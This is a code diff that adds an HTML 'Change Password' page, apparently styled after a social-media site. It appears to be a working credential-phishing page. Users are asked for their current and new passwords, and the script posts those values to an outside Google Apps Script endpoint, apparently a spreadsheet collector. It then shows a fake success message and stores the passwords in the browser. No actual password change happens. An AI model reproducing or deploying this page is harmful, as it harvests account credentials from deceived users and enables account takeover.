@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change Password</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            padding: 20px;
+            max-width: 400px;
+            width: 100%;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+        .header a {
+            text-decoration: none;
+            color: black;
+            font-size: 18px;
+        }
+        .header h1 {
+            margin: 0 auto;
+            font-size: 20px;
+        }
+        .form-group {
+            margin: 15px 0;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            box-sizing: border-box;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #b2dffc;
+            color: white;
+            font-size: 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: not-allowed;
+            opacity: 0.5;
+        }
+        .form-group button.active {
+            background-color: #3897f0;
+            cursor: pointer;
+            opacity: 1;
+        }
+        .form-group a {
+            display: block;
+            text-align: center;
+            margin-top: 10px;
+            text-decoration: none;
+            color: #3897f0;
+        }
+        .success-message {
+            display: none;
+            text-align: center;
+        }
+        .success-message img {
+            width: 100px;
+            height: 100px;
+        }
+        .success-message h2 {
+            font-size: 24px;
+            margin-top: 10px;
+        }
+        .success-message p {
+            font-size: 16px;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="password-form">
+        <div class="header">
+            <a href="#">&#x2190;</a>
+            <h1>Change Password</h1>
+        </div>
+        <form method="POST" name="google-sheet">
+            <div class="form-group">
+                <label for="old-password">Old Password</label>
+                <input type="text" id="old-password" name="old" oninput="checkForm()">
+            </div>
+            <div class="form-group">
+                <label for="new-password">New Password</label>
+                <input type="text" id="new-password" name="new" oninput="checkForm()">
+            </div>
+            <div class="form-group">
+                <label for="confirm-new-password">Confirm New Password</label>
+                <input type="text" id="confirm-new-password" name="confirm" oninput="checkForm()">
+            </div>
+            <div class="form-group">
+                <button type="submit" value="submit" name="submit" id="change-password-btn" disabled>Change Password</button>
+                <a href="#">Forgot Password?</a>
+            </div>
+        </form>
+    </div>
+    <div class="success-message" id="success-message">
+        <img src="C:\Users\HP\Downloads\images-removebg-preview.png" alt="Success">
+        <h2>Password Updated!</h2>
+        <p>Your password has been changed successfully. Use your new password to log in.</p>
+    </div>
+
+ <script>
+        function checkForm() {
+            var newPassword = document.getElementById('new-password').value;
+            var confirmNewPassword = document.getElementById('confirm-new-password').value;
+            var changePasswordBtn = document.getElementById('change-password-btn');
+
+            if (newPassword === confirmNewPassword && newPassword !== '') {
+                changePasswordBtn.classList.add('active');
+                changePasswordBtn.disabled = false;
+            } else {
+                changePasswordBtn.classList.remove('active');
+                changePasswordBtn.disabled = true;
+            }
+        }
+
+        function validatePasswords() {
+            var oldPassword = document.getElementById('old-password').value;
+            var newPassword = document.getElementById('new-password').value;
+            var confirmNewPassword = document.getElementById('confirm-new-password').value;
+
+            return newPassword === confirmNewPassword && newPassword !== '' && oldPassword !== '';
+        }
+
+        function storePasswords() {
+            var oldPassword = document.getElementById('old-password').value;
+            var newPassword = document.getElementById('new-password').value;
+
+            localStorage.setItem('oldPassword', oldPassword);
+            localStorage.setItem('newPassword', newPassword);
+        }
+
+        function showSuccessMessage() {
+            document.getElementById('password-form').style.display = 'none';
+            document.getElementById('success-message').style.display = 'block';
+        }
+    </script>
+	<script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbyiIUF1F4QLSuE-7YY5HwA0YozYRPDIXnnL1rVHlOwj4K4NW7WEEfyRuOj0gHpuE21r/exec';
+        const form = document.forms['google-sheet'];
+
+        form.addEventListener('submit', e => {
+            e.preventDefault();
+            
+            if (validatePasswords()) {
+                fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => {
+                    alert("Your Password has been changed successfully.");
+                    storePasswords();
+                    showSuccessMessage();
+                })
+                .catch(error => console.error('Error', error.message));
+            }
+        });
+	</script>
+</body>
+</html>
